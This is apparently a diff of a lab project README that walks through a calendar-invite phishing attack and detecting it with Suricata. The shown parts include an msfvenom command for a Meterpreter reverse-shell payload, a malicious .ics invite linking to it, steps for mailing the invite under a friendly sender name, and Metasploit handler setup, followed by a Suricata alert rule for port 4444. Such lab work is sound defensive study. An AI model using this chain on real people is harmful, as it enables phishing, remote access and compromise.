@@ -1,4 +1,4 @@
-## 🛡️Google-Calendar-Phishing-Attack-Suricata-and-Wazuh-Detection-Project
+# 🛡️Google-Calendar-Phishing-Attack-Suricata-and-Wazuh-Detection-Project
 This project demonstrates a realistic phishing attack using a malicious .ics calendar invite to deliver a payload and how to detect and alert on it using Suricata IDS.
 
 ## 📌 Lab Setup
@@ -12,9 +12,9 @@ This project demonstrates a realistic phishing attack using a malicious .ics cal
 
 
 ## ✅Phase 1: Setup and File Hosting on /Ubuntu VM
-# 🎯Goal
+### 🎯Goal
 Generate a reverse shell payload to be delivered via phishing.
-# 🛠️1.1 Generate Payload:
+#### 🛠️1.1 Generate Payload:
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=4444 -f exe > newpayload.exe
 ```
@@ -57,8 +57,8 @@ LOCATION:http://192.168.0.107/newpayload.exe
 END:VEVENT
 END:VCALENDAR
 ```
-## 🧪 How to Create and Use It
-# 📁 1. Save the .ics File
+### 🧪 How to Create and Use It
+#### 📁 1. Save the .ics File
 ```bash
 nano malicious_invite.ics
 ```
@@ -71,8 +71,8 @@ What you need before running:
 -Gmail App Password if your account has 2FA enabled (recommended)
 -Your .ics file ready
 
-## Python script to send .ics invite with friendly sender name
-# 📁 Save the .py File
+### Python script to send .ics invite with friendly sender name
+#### 📁 Save the .py File
 ```bash
 nano send_calendar_invite.py
 ```
@@ -131,7 +131,7 @@ except Exception as e:
 finally:
     server.quit()
 ```
-## How to use:
+### How to use:
 1.Save this as send_calendar_invite.py in the same folder as your malicious_invite.ics.
 2.Run the script with:
 ```bash
@@ -145,7 +145,7 @@ python3 send_calendar_invite.py
 Wazuh will log actions and forward events to the Wazuh Manager
 
 ## 🧪Phase 5: Execute the Attack
-# 1. On the Windows VM (Victim):
+### 1. On the Windows VM (Victim):
 Open Email Client:
   -Access the email account configured to receive the phishing email.
 Open the Received Email:
@@ -157,12 +157,12 @@ Click the Link in the Invite:
 Execute the Payload:
   -Run the downloaded newpayload.exe file.
 
-## 2.On the Kali Linux VM (Attacker):
-# 1.Start Metasploit Listener:
+### 2.On the Kali Linux VM (Attacker):
+#### 1.Start Metasploit Listener:
 ```bash
 msfconsole
 ```
-# 2.Configure and Start the Handler:
+#### 2.Configure and Start the Handler:
 ```bash
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
@@ -171,11 +171,11 @@ set LPORT 4444
 exploit
 ```
 Replace 192.168.56.101 with your Kali Linux host-only IP address.
-# 3.Establish Session:
+#### 3.Establish Session:
 Once the victim executes the payload, a Meterpreter session should be established.
 
 ## 🔍 Phase 5: Detecting the Attack with Suricata
-## 1.Create Custom Suricata Rules
+### 1.Create Custom Suricata Rules
 1.Edit local.rules File:
 ```bash
 sudo nano /etc/suricata/rules/local.rules
@@ -190,34 +190,36 @@ alert tcp any any -> any 4444 (msg:"Possible Reverse Shell Connection"; sid:1000
   -Press Enter to confirm.
   -Press Ctrl + X to exit.
   
-## Edit Suricata config to load local.rules
+### Edit Suricata config to load local.rules
 Open the Suricata configuration file:
 ```bash
 sudo nano /etc/suricata/suricata.yaml
 ```
 Search for the **rule-files**: section (press Ctrl+W then type rule-files:)
 Modify it like this (if not already present):
+
 ```bash
 rule-files:
   - local.rules
 ```
+
 -Make sure this block is under the default-rule-path: section like below:
 ```bash
 default-rule-path: /etc/suricata/rules
 rule-files:
   - local.rules
 ```
-## Test the Suricata configuration
+### Test the Suricata configuration
 ```bash
 sudo suricata -T -c /etc/suricata/suricata.yaml -v
 ```
 You should see configuration OK. If not, check for spacing/indentation errors in YAML.
 
-## Restart Suricata
+### Restart Suricata
 ```bash
 sudo systemctl restart suricata
 ```
- ## Verify rule hits
+ ### Verify rule hits
  ```bash
 sudo tail -f /var/log/suricata/fast.log
 ```
